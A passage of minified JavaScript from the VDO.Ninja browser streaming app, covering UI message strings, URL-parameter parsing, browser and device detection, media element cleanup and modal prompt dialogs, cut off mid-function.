var formSubmitting=!0,activatedPreview=!1,screensharesupport=!0,FirefoxEnumerated=!1,Callbacks=[],CtrlPressed=!1,MousePressed=!1,AltPressed=!1,KeyPressedTimeout=0,PPTKeyPressed=!1,translation=!1,miscTranslations={start:"START","new-display-name":"Enter a new Display Name for this stream","submit-error-report":"Press OK to submit any error logs to VDO.Ninja. Error logs may contain private information.","director-redirect-1":"The director wishes to redirect you to the URL: ","director-redirect-2":"\n\nPress OK to be redirected.","add-a-label":"Add a label","audio-processing-disabled":"Audio processing is disabled with this guest. Can't mute or change volume","not-the-director":"<span color='red'>You are not the director of this room. You will have limited to no control. See <a target='_blank' href='https://docs.vdo.ninja/director-settings/codirector'>&codirector</a> on how to become a co-director.</span>","room-is-claimed":"The room is already claimed by someone else.\n\nOnly the first person to join a room is the assigned director.\n\nRefresh after the first director leaves to claim.","token-room-is-claimed":"The room is claimed by someone else.\n\nJoin as a guest or co-director instead.","room-is-claimed-codirector":"The room is already claimed by someone else.\n\nTrying to join as a co-director...","streamid-already-published":"The stream ID you are publishing to is already in use.\n\nPlease try with a different invite link or refresh to retry again.\n\nYou will now be disconnected.",director:"Director","unknown-user":"Unknown User","room-test-not-good":"The room name 'test' is very commonly used and may not be secure.\n\nAre you sure you wish to proceed?","load-previous-session":"Would you like to load your previous session's settings?","enter-password":"Please enter the password below: \n\n(Note: Passwords are case-sensitive and you will not be alerted if it is incorrect.)","enter-password-2":"Please enter the password below: \n\n(Note: Passwords are case-sensitive.)","enter-director-password":"Please enter the director's password:\n\n(Note: Passwords are case-sensitive and you will not be alerted if it is incorrect.)","password-incorrect":"The password was incorrect.\n\nRefresh and try again.","enter-display-name":"Please enter your display name:","enter-new-display-name":"Enter a new Display Name for this stream","what-bitrate":"What bitrate would you like to record at? (kbps)\n\n - This remote guest will save the recording directly to their local disk.\n\n - The recording can fail, so have backup recordings going.\n\n - This record option does not use Internet bandwidth and offers a high quality recording","enter-website":"Enter a website URL to share","press-ok-to-record":"You can specify the recording bitrate below (kbps)\n\n - Press OK to start recording. Press again to stop and download.\n\n - Keep this browser tab active to continue recording.\n\n - This recording option will record to your local disk.\n\n - Quality may depend on the Internet connection between you and the guest.","no-streamID-provided":"No streamID was provided; one will be generated randomily.\n\nStream ID: ","alphanumeric-only":"Info: Only AlphaNumeric characters should be used for the stream ID.\n\nThe offending characters have been replaced by an underscore","stream-id-too-long":"The Stream ID should be less than 45 alPhaNuMeric characters long.\n\nWe will trim it to length.","share-with-trusted":"Share only with those you trust","pass-recommended":"A password is recommended","insecure-room-name":"Insecure room name.","allowed-chars":"Allowed chars",transfer:"transfer",armed:"armed","transfer-guest-to-room":"Transfer guests to room:\n\n(Please note: rooms must share the same password)","transfer-guest-to-url":"Transfer guests to new website URL.\n\nGuests will be prompted to accept unless they are using &consent","change-url":"change URL","mute-in-scene":"mute in scene","unmute-guest":"unmute guest",unmute:"unmute",undeafen:"undeafen",deafen:"deafen guest",unblind:"unblind",blind:"blind guest","mute-guest":"mute guest",mute:"mute",unhide:"unhide guest","hide-guest":"Hide","confirm-disconnect-users":"Are you sure you wish to disconnect these users?","confirm-disconnect-user":"Are you sure you wish to disconnect this user?","enter-new-codirector-password":"Enter a co-director password to use","control-room-co-director":"Control Room: Co-Director","volume-control":"Volume control for local playback only","signal-meter":"Video packet loss indicator of video preview; green is good, red is bad. Flame implies CPU is overloaded. May not reflect the packet loss seen by scenes or other guests.","waiting-for-the-stream":"Waiting for the stream. Tip: Adding &cleanoutput to the URL will hide this spinner, or click to retry, which will also hide it.","main-director":"Main Director","share-a-screen":"Share a screen","stop-screen-sharing":"Stop screen sharing","you-have-been-transferred":"You've been transferred to a different room","you-have-been-activated":"The director has now allowed you to see others in the room","you-not-yet-activated":"Please wait until the director brings you into the room","you-are-no-longer-a-co-director":"You are no longer a co-director as you were transferred.",transferred:"Transferred","room-changed":"Your room has changed","headphones-tip":"<i>Tip:</i> Use headphones to avoid audio echo issues.","camera-tip-c922":"<i>Tip:</i> To achieve 60-fps with a C922 webcam, low-light compensation needs to be turned off, exposure set to auto, and 720p used.","camera-tip-camlink":"<i>Tip:</i> A Cam Link may glitch green/purple if accessed elsewhere while already in use.","samsung-a-series":"Samsung A-series phones may have issues with Chrome; if so, try Firefox Mobile instead or switch video codecs.","screen-permissions-denied":"Permission to capture denied. Ensure your browser has screen record system permissions\n\n1.On your Mac, choose Apple menu  > System Preferences, click Security & Privacy , then click Privacy.\n2.Select Screen Recording.\n3.Select the checkbox next to your browser to allow it to record your screen.","change-audio-output-device":"Audio could not be captured. Please make sure you have an audio output device available.\n\nSome gaming headsets (ie: Corsair) may need to be set to 2-channel output to work, as surround sound drivers may cause problems.","prompt-access-request":" is trying to view your stream. Allow them?","confirm-reload-user":"Are you sure you wish to reload this user's browser?","webrtc-is-blocked":"âš  This browser has either blocked WebRTC or does not support it.\n\nThis site will not work without it.\n\nDisable any browser extensions or privacy settings that may be blocking WebRTC, or try a different browser.","not-clean-session":"Video effects or canvas rendering failed.\n\nCheck to ensure any remotely hosted images are cross-origin allowed.","ios-no-screen-share":"Sorry, but your iOS browser does not support screen-sharing.\n\nPlease see <a href='https://docs.vdo.ninja/guides/screen-share-your-iphone-ipad' target='_blank'>this guide</a> for an alternative method to do so.","android-no-screen-share":"Sorry, your mobile browser does not support screen-sharing.\n\nThe <a href='https://docs.vdo.ninja/getting-started/native-mobile-app-versions' target='_blank'>Android native app</a> does offer basic support for it though.","no-screen-share-supported":"Sorry, your browser does not support screen-sharing.\n\nPlease use the desktop versions of Firefox or Chrome instead.","speech-not-suppoted":"âš  Speech Recognition is not supported by this browser","blue-yeti-tip":"<i>Tip:</i> Blue Yeti microphones may experience issues being overly loud. <a href='https://support.google.com/chrome/thread/7542181?hl=en&msgid=79691143'>Please see here</a> for a solution or disable auto-gain in VDO.Ninja.","sample-rate-too-high":"Your audio playback device has its sample rate set very high. If having audio issues, try using 48-kHz instead.","site-not-responsive":"<h3>Notice: The system cannot be accessed or is currently slow to respond.</h3>\nIf a routing issue, try adding <i title='or try visiting https://proxy.vdo.ninja/'>&proxy</i> to the URL; you can also try <i>https://proxy.vdo.ninja</i> or a VPN if the service is blocked in your country.\n\nIf the main service is down, a backup version is also available here: <i>https://backup.vdo.ninja</i>\n\nContact steve@seguin.email for added help.\n\nThis service requires the use of Websockets over port 443.","no-audio-source-detected":"No Audio Source was detected.\n\nIf you were wanting to capture an Application's Audio, please see:\nhttps://docs.vdo.ninja/help/guides-and-how-tos#audio for some guides.","viewer-count":"Total outbound p2p connections of this remote stream","enter-url-for-widget":"Enter a URL for a page to embed as a sidebar","director-password":"Enter the main director's password","vision-disabled":"The Director has disabled your vision temporarily<br /><br ><center><i style='font-size:500%;' class='las la-eye-slash'></i></center>","invalid-remote-code":"Invalid remote control code.\n\nUse the field below to try again with a different passcode.","invalid-remote-code-obs":"Invalid remote control code.\n\nThe remote OBS system needs a matching passcode set using &remote.\n\nSee the documentation for help..","request-rejected-obs":"The request was rejected.\n\nThe remote OBS system needs a matching passcode set using &remote.\n\nSee the documentation for help.","remote-token-rejected":"The remote request failed; the &remote token did not match or the remote user does not allow remote control.","remote-control-failed":"The remote control request failed.","remote-peer-connected":"Remote peer connected to video stream.\n\nConnection to handshake server being killed on request. This increases security, but the peer will not be able to reconnect automatically on connection failure.\n\nPress OK to start the stream!","director-denied":"The main director denied you as a co-director","only-main-director":"Only the main director can transfer this guest","request-failed":"The request failed; you can't apply this action","tokens-did-not-match":"The remote request failed; the remote token did not match or the remote user does not allow remote control.","token-not-director":"The request failed; the remote user did not recognize you as the director","approved-as-director":"The director approved you as a co-director","you-are-a-codirector":"You are a co-director of this room; you have partial director control assigned to you.","this-is-you":"This is you, a co-director.<br />You are also a performer.","preview-meshcast-disabled":"You can't adjust the preview bitrate for Meshcast or WHIP-based streams","no-network":"Network connection lost ğŸ¤·â€â™€ï¸âŒğŸ“¶","no-network-details":"Network connection lost. ğŸ¤·â€â™€ï¸âŒğŸ“¶\n\nHave you lost your Internet connection?"};function getTranslation(key){return translation.innerHTML&&key in translation.innerHTML?translation.innerHTML[key]:key in miscTranslations?miscTranslations[key]:(warnlog("misc translation not found"),key.replaceAll("-"," "))}if(void 0===session){var session=WebRTC.Media;session.streamID=session.generateStreamID(),errorlog("Serious error: WebRTC session didn't load in time")}try{!window.onorientationchange&&screen.orientation&&(window.onorientationchange=function(){log("screen.orientation triggered.. but nothing linked")},screen.orientation.addEventListener("change",window.onorientationchange))}catch(e){errorlog(e)}!function(w){w.URLSearchParams=w.URLSearchParams||function(searchString){var self=this;searchString=searchString.replace("??","?"),self.searchString=searchString,self.get=function(name){var results=new RegExp("[?&]"+name+"=([^&#]*)").exec(self.searchString);return null==results?null:decodeURI(results[1])||0}}}(window);var urlEdited=window.location.search.replace(/\?\?/g,"?");urlEdited=(urlEdited=urlEdited.replace(/\?/g,"&")).replace(/\&/,"?");var urlParams=new URLSearchParams(urlEdited);(urlParams.has("invite")||urlParams.has("i")||urlParams.has("code"))&&session.decodeInvite(urlParams.get("invite")||urlParams.get("i")||urlParams.get("code")),session.decrypted?(session.decrypted=session.decrypted+urlEdited.replace("?","&"),session.decrypted=session.decrypted.replace(/\?/g,"&"),session.decrypted=session.decrypted.replace(/\&/,"?"),urlParams=new URLSearchParams(session.decrypted)):urlEdited!==window.location.search&&(warnlog(window.location.search+" changed to "+urlEdited),window.history.pushState({path:urlEdited.toString()},"",urlEdited.toString())),delete urlEdited;var isIFrame=!1;function mapToAll(targets,callback,parentElement=document){if(!targets)return;if(!parentElement)return;const target=parentElement.querySelectorAll(targets);for(let i=0;i<target.length;i++)callback(target[i])}function changeParam(url,paramName,paramValue){paramName=paramName.replace("?","");for(var qind=url.indexOf("?"),params=(url=url.replace("?","&")).substring(qind+1).split("&"),query="",match=!1,i=0;i<params.length;i++){var tokens=params[i].split("="),name=tokens[0],value="";if(tokens.length>1&&""!==tokens[1]&&(value=tokens[1]),name==paramName){if(match)continue;match=!0,value=paramValue}""!==value&&(value="="+value),query=""==query?"?"+name+value:query+"&"+name+value}return url.substring(0,qind)+query}function saveRoom(ele){session.sticky=!0,ele.parentNode.removeChild(ele),setStorage("permission","yes"),setStorage("settings",encodeURI(window.location.href),999)}function updateURL(param,force=!1,cleanUrl=!1){if(!session.decrypted){var para=(param=param.replace("?","")).split("=");if(cleanUrl){if(history.pushState){var href=new URL(cleanUrl);href=1==para.length?changeParam(cleanUrl,para[0],""):changeParam(cleanUrl,para[0],para[1]),log("--"+href.toString()),window.history.pushState({path:href.toString()},"",href.toString())}}else if(urlParams.has(para[0])){if(force&&history.pushState){href=new URL(window.location.href);href=1==para.length?changeParam(window.location.href,para[0],""):changeParam(window.location.href,para[0],para[1]),log("---"+href.toString()),window.history.pushState({path:href.toString()},"",href.toString())}}else if(history.pushState){var newurl,arr=(href=(href=window.location.href).replace("??","?")).split("?");newurl=arr.length>1&&""!==arr[1]?href+"&"+param:href+"?"+param,window.history.pushState({path:newurl.toString()},"",newurl.toString())}session.sticky&&setStorage("settings",encodeURI(window.location.href),999),urlParams=new URLSearchParams(window.location.search)}}function applyNewParams(changeParams){for(var key in changeParams)session[key]=changeParams[key],log(key);log(changeParams),updateMixer()}function submitDebugLog(msg=!1){try{if(navigator.userAgent){var userAgent=navigator.userAgent;appendDebugLog({userAgent:userAgent})}navigator.platform&&appendDebugLog({userAgent:navigator.platform})}catch(e){}if(window.focus(),confirm(getTranslation("submit-error-report"))){var request=new XMLHttpRequest,recordResults=session.streamID+"_"+parseInt(Date.now());request.open("POST","https://reports.vdo.ninja/?name="+recordResults),session.cleanOutput||warnUser("Report any details of your bug report to steve@seguin.email, along with the following link: <a target='_blank' onclick='copyFunction(this, event)' href='https://reports.vdo.ninja/?name="+recordResults+"'>https://reports.vdo.ninja/?name="+recordResults+"</a>",!1,!1),console.log("Report any details of your bug report to steve@seguin.email, along with the following ID: "+recordResults),request.send(JSON.stringify(errorReport)),errorReport=[],document.getElementById("reportbutton")&&getById("reportbutton").classList.add("hidden")}}function URLFromFiles(files){const promises=files.map((file=>fetch(file).then((response=>response.text()))));return Promise.all(promises).then((texts=>{const text=texts.join(""),blob=new Blob([text],{type:"application/javascript"});return URL.createObjectURL(blob)}))}function detectCPUSupport(){let cpuThreads=navigator.hardwareConcurrency;return!!cpuThreads&&cpuThreads+" threads"}function detectGPUSupport(){try{const gl=document.createElement("canvas").getContext("webgl");if(!gl)return!1;if(!Firefox)try{const debugInfo=gl.getExtension("WEBGL_debug_renderer_info");if(debugInfo)return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}catch(e){}try{return gl.getParameter(gl.RENDERER)||!1}catch(e){}}catch(e){}return!1}function isOperaGX(){return!!window.opr&&!!opr.addons||!!window.opera||navigator.userAgent.indexOf(" OPR/75")>=0}function isSamsungASeries(){return navigator.userAgent.includes("; SM-A")||!1}function getChromiumVersion(){var raw=navigator.userAgent.match(/Chrom(e|ium)\/([0-9]+)\./);return!!raw&&parseInt(raw[2],10)}function getiOSVersion(){try{var agent=navigator.userAgent,start=agent.indexOf("OS ");return(agent.indexOf("iPhone")>-1||agent.indexOf("iPad")>-1)&&start>-1?window.Number(agent.substr(start+3,3).replace("_",".")):0}catch(e){return 0}return 0}function safariVersion(){var ver=0;try{(ver=navigator.appVersion.split("Version/")).length>1&&(ver=ver[1].split(" Safari")),ver.length>1&&(ver=ver[0].split(".")),ver=ver.length>1?parseInt(ver[0]):0}catch(e){return 0}return ver}parent&&window.location!==window.parent.location&&(isIFrame=!0);try{var iOS=!!navigator.platform&&/iPad|iPhone|iPod/.test(navigator.platform),iPad=navigator.maxTouchPoints&&navigator.maxTouchPoints>2&&/MacIntel/.test(navigator.platform),macOS=-1!=navigator.userAgent.indexOf("Mac OS X");macOS=macOS&&!(iOS||iPad);var Firefox=navigator.userAgent.indexOf("Firefox")>=0;Firefox&&(Firefox=parseInt(navigator.userAgent.split("irefox/").pop())||!0);var Android=navigator.userAgent.toLowerCase().indexOf("android")>-1,ChromiumVersion=getChromiumVersion(),OperaGx=isOperaGX(),SafariVersion=safariVersion()||getiOSVersion();(iOS||iPad)&&SafariVersion&&(Firefox&&(Firefox=!1),ChromiumVersion&&(ChromiumVersion=!1));var SamsungASeries=isSamsungASeries(),isVingester=navigator.userAgent.indexOf("Vingester")>=0,gpgpuSupport=detectGPUSupport();log(gpgpuSupport);var cpuSupport=detectCPUSupport();log(cpuSupport);var iPhone12Up=!1;iOS&&!iPad&&window.devicePixelRatio.toFixed(2)>=3&&window.screen.height>800&&414!=window.screen.width&&(iPhone12Up=!0)}catch(e){errorlog(e)}function isAlphaNumeric(str){var code,i,len;for(i=0,len=str.length;i<len;i++)if(!((code=str.charCodeAt(i))>47&&code<58||code>64&&code<91||code>96&&code<123))return!1;return!0}function convertStringToArrayBufferView(str){for(var bytes=new Uint8Array(str.length),iii=0;iii<str.length;iii++)bytes[iii]=str.charCodeAt(iii);return bytes}function toHexString(byteArray){return Array.prototype.map.call(byteArray,(function(byte){return("0"+(255&byte).toString(16)).slice(-2)})).join("")}function toByteArray(hexString){for(var result=[],i=0;i<hexString.length;i+=2)result.push(parseInt(hexString.substr(i,2),16));return new Uint8Array(result)}function playAllVideos(){if(session.firstPlayTriggered&&"suspended"==session.audioCtx.state)try{session.audioCtx.resume()}catch(e){warnlog(e)}for(var i in session.rpcs)if(!session.rpcs[i].whip)try{session.rpcs[i].videoElement&&(log("I: "+i),session.rpcs[i].videoElement.paused?setTimeout((function(UUID){session.rpcs[UUID].videoElement.play().then((_=>{log("playing 3 "),(!0===session.audioEffects||session.pushLoudness)&&(log("updateIncomingAudioElement('"+UUID+"')"),updateIncomingAudioElement(UUID))})).catch(errorlog)}),0,i):(!0===session.audioEffects||session.pushLoudness)&&(updateIncomingAudioElement(i),log("updateIncomingAudioElement('"+i+"')")))}catch(e){errorlog(e)}}session.audioCtx&&session.audioCtx.sampleRate&&session.audioCtx.sampleRate>192e3&&(console.warn("Your audio playback device has a very high sample-rate set of "+session.audioCtx.sampleRate+"-Hz. If having audio problems, lower to at least 192000-Hz, but preferably 48000-Hz."),session.cleanOutput||(miniTranslate(getById("audioTipContextSR"),"sample-rate-too-high"),getById("audioTipSR").classList.remove("hidden"))),isVingester&&console.warn("If Vingester isn't able to capture audio, get a fixed version of Vingester from here: https://github.com/steveseguin/vingester/releases/");var videoElements=Array.from(document.querySelectorAll("video")),audioElements=Array.from(document.querySelectorAll("audio")),mediaStreamCounter=0;function createMediaStream(){return mediaStreamCounter+=1,new MediaStream}function deleteOldMedia(){log("CHECKING FOR OLD MEDIA");for(var i=videoElements.length;i--;)if(!1===videoElements[i].isConnected&&(null==videoElements[i].srcObject||videoElements[i].srcObject&&!1===videoElements[i].srcObject.active)){if(videoElements[i].dataset&&videoElements[i].dataset.UUID&&videoElements[i].dataset.UUID in session.rpcs)continue;videoElements[i].pause(),videoElements[i].removeAttribute("id"),videoElements[i].removeAttribute("src"),videoElements[i].load(),videoElements[i].remove(),videoElements[i]=null,videoElements.splice(i,1)}for(i=audioElements.length;i--;)if(!1===audioElements[i].isConnected&&(null==audioElements[i].srcObject||audioElements[i].srcObject&&!1===audioElements[i].srcObject.active)){if(audioElements[i].dataset&&audioElements[i].dataset.UUID&&audioElements[i].dataset.UUID in session.rpcs)continue;audioElements[i].pause(),audioElements[i].id=null,audioElements[i].removeAttribute("src"),audioElements[i].load(),audioElements[i].remove(),audioElements[i]=null,audioElements.splice(i,1)}}function createAudioElement(){try{deleteOldMedia()}catch(e){errorlog(e)}var a=document.createElement("audio");return audioElements.push(a),a}function compare_deltas(a,b){var aa=a.delta||0,bb=b.delta||0;return aa>bb?1:aa<bb?-1:0}async function fetchWithTimeout(URL,timeout=8e3){try{const controller=new AbortController,timeout_id=setTimeout((()=>controller.abort()),timeout),response=await fetch(URL,{timeout:timeout,signal:controller.signal});return clearTimeout(timeout_id),response}catch(e){return errorlog(e),await fetch(URL)}}function createVideoElement(){try{deleteOldMedia()}catch(e){errorlog(e)}var v=document.createElement("video");return videoElements.push(v),"number"==typeof session.volume&&(v.volume=session.volume,log("setting volume to manual")),v}function getTimezone(){if(!1!==session.tz)return session.tz;var today=new Date;return(today=>{return today.getTimezoneOffset()<(jan=new Date(0,1),jul=new Date(6,1),Math.max(jan.getTimezoneOffset(),jul.getTimezoneOffset()));var jan,jul})(today)?today.getTimezoneOffset()+60:today.getTimezoneOffset()}function promptUser(eleId,UUID=null){session.beepToNotify&&playtone(),document.getElementById("modalBackdrop")&&(getById("promptModal").innerHTML="",getById("promptModal").remove(),getById("modalBackdrop").innerHTML="",getById("modalBackdrop").remove()),zindex=30+document.querySelectorAll("#promptModal").length,modalTemplate=`<div id="promptModal" style="z-index:${zindex+2}">\t\n\t\t<div class="promptModalInner">\n\t\t\t<span class='modalClose' onclick="closeModal()">Ã—</span>\n\t\t\t<span id='promptModalMessage'></span>\n\t\t</div>\n\t</div>\n\t<div id="modalBackdrop" style="z-index:${zindex+1}"></div>`,document.body.insertAdjacentHTML("beforeend",modalTemplate),getById("promptModalMessage").innerHTML=getById(eleId).innerHTML,UUID&&(getById("promptModalMessage").dataset.UUID=UUID),document.getElementById("modalBackdrop").addEventListener("click",closeModal),getById("promptModal").addEventListener("click",(function(e){return e.stopPropagation(),!1}))}async function delay(ms){return await new Promise(((resolve,reject)=>{setTimeout(resolve,ms)}))}var Prompts={};async function promptAlt(inputText,block=!1,asterix=!1,value=!1,time=!1,recording=!1,hotkey=!1){var result=null;return session.beepToNotify&&playtone(),await new Promise(((resolve,reject)=>{var promptID="pid_"+Math.random().toString(36).substr(2,9);Prompts[promptID]={},Prompts[promptID].resolve=resolve,Prompts[promptID].reject=reject;var zindex=1030+document.querySelectorAll(".promptModal").length;if(block)var backdropClass="opaqueBackdrop";else backdropClass="modalBackdrop";inputText=(inputText="<span style='font-size:1.2em'>"+inputText.replace("\n","</span><br /><span>")+"</span>").replace(/\n/g,"<br />");var type="text";asterix&&(type="password"),modalTemplate=time?`<div id="modal_${promptID}" class="promptModal" style="z-index:${zindex+2}">\t\n\t\t\t\t\t<div class="promptModalInner">\n\t\t\t\t\t\t<span id="close_${promptID}" class='modalClose' data-pid="${promptID}">Ã—</span>\n\t\t\t\t\t\t<span class='promptModalMessage' style='margin:20px'>${inputText}</span>\n\t\t\t\t\t\t<span style="margin:20px";>\n\t\t\t\t\t\t\t<input id="input_${promptID}" title="minutes" autocorrect="off" autocapitalize="none" data-pid="${promptID}" value="0" style="width:50px;padding:4px;margin:4px;" min="0" type="number" /> minutes, \n\t\t\t\t\t\t\t<input id="input_${promptID}_sec"  title="seconds" autocorrect="off" autocapitalize="none" data-pid="${promptID}" value="0"  style="width:50px;padding:4px;margin:4px;" max="59" min="0" type="number" /> seconds\n\t\t\t\t\t\t\t<br /><br />\n\t\t\t\t\t\t\t<input type='checkbox' id="countup_${promptID}" style="margin-left:30px" title="Count up from 0 instead" data-pid="${promptID}" /> Count up from zero instead\n\t\t\t\t\t\t</span>\n\t\t\t\t\t\t<br /><br />\n\t\t\t\t\t\t<button id="submit_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0 0 0 30px" data-translate='ok'>âœ” OK</button>\n\t\t\t\t\t\t<button id="cancel_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0;" data-translate='cancel'>âŒ Cancel</button>\n\t\t\t\t\t\t<br /><br />\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t<div id="modalBackdrop_${promptID}" class="${backdropClass}" style="z-index:${zindex+1}"></div>`:recording?`<div id="modal_${promptID}" class="promptModal" style="z-index:${zindex+2}">\t\n\t\t\t\t\t<div class="promptModalInner">\n\t\t\t\t\t\t<span id="close_${promptID}" class='modalClose' data-pid="${promptID}">Ã—</span>\n\t\t\t\t\t\t<span class='promptModalMessage'>${inputText}</span>\n\t\t\t\t\t\t<span style="margin:20px";>\n\t\t\t\t\t\t\t<input id="input_${promptID}" autocorrect="off" autocapitalize="none" data-pid="${promptID}"  type="${type}" class="largeTextEntry" />\n\t\t\t\t\t\t\t<input id="input_${promptID}_gdrive" title="Upload to Google Drive also"  data-pid="${promptID}" type="checkbox" /> Upload to your Google Drive\n\t\t\t\t\t\t\t<input id="input_${promptID}_dbx" title="Upload to Dropbox also"  data-pid="${promptID}" type="checkbox" /> Upload to your Drop Box\n\t\t\t\t\t\t</span>\n\t\t\t\t\t\t<br /><br />\n\t\t\t\t\t\t<button id="submit_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0 0 0 55px;" data-translate='ok'>âœ” OK</button>\n\t\t\t\t\t\t<button id="cancel_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0;" data-translate='cancel'>âŒ Cancel</button>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t<div id="modalBackdrop_${promptID}" class="${backdropClass}" style="z-index:${zindex+1}"></div>`:hotkey?`<div id="modal_${promptID}" class="promptModal" style="z-index:${zindex+2}">\t\n\t\t\t\t\t<div class="promptModalInner">\n\t\t\t\t\t\t<span id="close_${promptID}" class='modalClose' data-pid="${promptID}">Ã—</span>\n\t\t\t\t\t\t<span class='promptModalMessage'>${inputText}</span>\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<span style="margin:20px";>\n\t\t\t\t\t\t\t<label title="Choose a hotkey for Hold-to-Talk.">Press-to-Talk Hot-key</label>\n\t\t\t\t\t\t\t<input type="text" id="input_${promptID}"  placeholder="press a key here" style="padding-left: 7px;" onkeypress="event.preventDefault;event.stopPropagation();return false;" onkeyup="event.preventDefault;event.stopPropagation();return false;" onkeydown="setHotKey();"/>\n\t\t\t\t\t\t\t<button onclick="setHotKey(false);" style="margin: 0 0 0 4px; border-radius: 5px; padding: 3px 3px;">Clear</button>\n\t\t\t\t\t\t\t<button id="submit_${promptID}" data-pid="${promptID}" style="min-width:70px; color:black; background-color: #fff; position: relative;border: 1px solid #999; margin: 0 0 0 10px;" data-translate='ok'>Close</button>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<br />\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t<div id="modalBackdrop_${promptID}" class="${backdropClass}" style="z-index:${zindex+1}"></div>`:`<div id="modal_${promptID}" class="promptModal" style="z-index:${zindex+2}">\t\n\t\t\t\t\t<div class="promptModalInner">\n\t\t\t\t\t\t<span id="close_${promptID}" class='modalClose' data-pid="${promptID}">Ã—</span>\n\t\t\t\t\t\t<span class='promptModalMessage'>${inputText}</span>\n\t\t\t\t\t\t<input id="input_${promptID}" autocorrect="off" autocapitalize="none" data-pid="${promptID}"  type="${type}" class="largeTextEntry" />\n\t\t\t\t\t\t<button id="submit_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0 0 0 55px;" data-translate='ok'>âœ” OK</button>\n\t\t\t\t\t\t<button id="cancel_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0;" data-translate='cancel'>âŒ Cancel</button>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t<div id="modalBackdrop_${promptID}" class="${backdropClass}" style="z-index:${zindex+1}"></div>`,document.body.insertAdjacentHTML("beforeend",modalTemplate),document.getElementById("input_"+promptID).focus(),!1!==value&&(time?(document.getElementById("input_"+promptID).value=parseInt(value/60),document.getElementById("input_"+promptID+"_sec").value=parseInt(value)%60):document.getElementById("input_"+promptID).value=value),time?(document.getElementById("input_"+promptID).addEventListener("keyup",(function(event){"Enter"===event.key&&document.getElementById("input_"+promptID+"_sec").focus()})),document.getElementById("input_"+promptID+"_sec").addEventListener("keyup",(function(event){"Enter"===event.key&&document.getElementById("submit_"+promptID).focus()})),document.getElementById("countup_"+promptID).addEventListener("click",(function(event){document.getElementById("countup_"+promptID).checked?(document.getElementById("input_"+promptID).disabled=!0,document.getElementById("input_"+promptID+"_sec").disabled=!0):(document.getElementById("input_"+promptID).disabled=!1,document.getElementById("input_"+promptID+"_sec").disabled=!1,delete document.getElementById("input_"+promptID).disabled,delete document.getElementById("input_"+promptID+"_sec").disabled)}))):document.getElementById("input_"+promptID).addEventListener("keyup",(function(event){if("Enter"===event.key){var pid=event.target.dataset.pid;result=document.getElementById("input_"+pid).value,document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve()}}));try{document.getElementById("submit_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid;time?(result=parseInt(document.getElementById("input_"+pid+"_sec").value)+60*parseInt(document.getElementById("input_"+pid).value),document.getElementById("countup_"+promptID).checked&&(result=0)):result=document.getElementById("input_"+pid).value,document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve()}))}catch(e){}try{document.getElementById("cancel_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid;document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve()}))}catch(e){}try{document.getElementById("close_"+promptID).addEventListener("click",(function(event){var pid=event.target.dataset.pid;document.getElementById("modal_"+pid).remove(),document.getElementById("modalBackdrop_"+pid).remove(),Prompts[pid].resolve()}))}catch(e){}getById("modal_"+promptID).addEventListener("click",(function(e){return e.stopPropagation(),!1}))})),result}async function promptRecord(){var result=null;return session.beepToNotify&&playtone(),await new Promise(((resolve,reject)=>{var promptID="pid_"+Math.random().toString(36).substr(2,9);Prompts[promptID]={},Prompts[promptID].resolve=resolve,Prompts[promptID].reject=reject;var zindex=1030+document.querySelectorAll(".promptModal").length,inputText="RECORD SETTINGS";inputText=(inputText="<span style='font-size:1.2em'>"+inputText.replace("\n","</span><br /><span>")+"</span>").replace(/\n/g,"<br />");modalTemplate=`<div id="modal_${promptID}" class="promptModal" style="z-index:${zindex+2}">\t\n\t\t\t\t<div class="promptModalInner">\n\t\t\t\t\t<span id="close_${promptID}" class='modalClose' data-pid="${promptID}">Ã—</span>\n\t\t\t\t\t<span class='promptModalMessage'>${inputText}</span>\n\t\t\t\t\t<span style="margin:20px";>\n\t\t\t\t\t\t<input id="input_${promptID}" autocorrect="off" autocapitalize="none" data-pid="${promptID}"  type="text" class="largeTextEntry" />\n\t\t\t\t\t\t<input id="input_${promptID}_gdrive" title="Upload to Google Drive also"  data-pid="${promptID}" type="checkbox" /> Upload to your Google Drive\n\t\t\t\t\t\t<input id="input_${promptID}_dbx" title="Upload to Dropbox also"  data-pid="${promptID}" type="checkbox" /> Upload to your Drop Box\n\t\t\t\t\t</span>\n\t\t\t\t\t<br /><br />\n\t\t\t\t\t<button id="submit_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0 0 0 55px;" data-translate='ok'>âœ” OK</button>\n\t\t\t\t\t<button id="cancel_${promptID}" data-pid="${promptID}" style="width:120px; background-color: #fff; position: relative;border: 1px solid #999; margin: 0;" data-translate='cancel'>âŒ Cancel</button>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t\t<div id="modalBackdrop_${promptID}" class="modalBackdrop" style="z-index:${zindex+1}"></div>`,document.body.insertAdjacentHTML("beforeend",modalTemplate),getById(`input_${promptID}_gdrive`).onchange=async function(){this.checked?this.uploadLink=await session.gdrive.startResumableUpload():this.uploadLink=null},document.getElementById("input_"+promptID).focus(),document.getElementById("input_"+promptID).addEventListener("keyup",(function(event){if("Enter"===event.key){var 